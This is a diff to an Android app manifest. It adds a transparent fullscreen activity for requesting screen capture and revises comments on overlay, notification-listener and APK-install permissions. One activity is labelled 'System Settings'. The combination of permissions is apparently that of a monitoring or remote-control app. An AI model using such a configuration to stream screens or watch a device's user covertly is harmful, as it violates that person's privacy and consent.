@@ -58,7 +58,7 @@
     <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
     <uses-permission android:name="android.permission.USE_EXACT_ALARM"/>
 
-    <!-- Overlay -->
+    <!-- Overlay — required to launch activities from background service -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
 
     <!-- Screen capture -->
@@ -68,7 +68,7 @@
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
     <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"/>
 
-    <!-- APK install (for KidsInstaller) -->
+    <!-- APK install -->
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
 
     <!-- Shizuku -->
@@ -103,7 +103,13 @@
             android:label="System Settings"
             android:theme="@style/Theme.App.Setup"/>
 
-        <!-- Core service — mediaProjection REMOVED (caused crash on Android 14+) -->
+        <!-- MediaProjection permission request — transparent, shown when screen stream is needed -->
+        <activity
+            android:name=".setup.MediaProjectionActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen"
+            android:exported="false"/>
+
+        <!-- Core service -->
         <service
             android:name=".core.CoreService"
             android:exported="false"
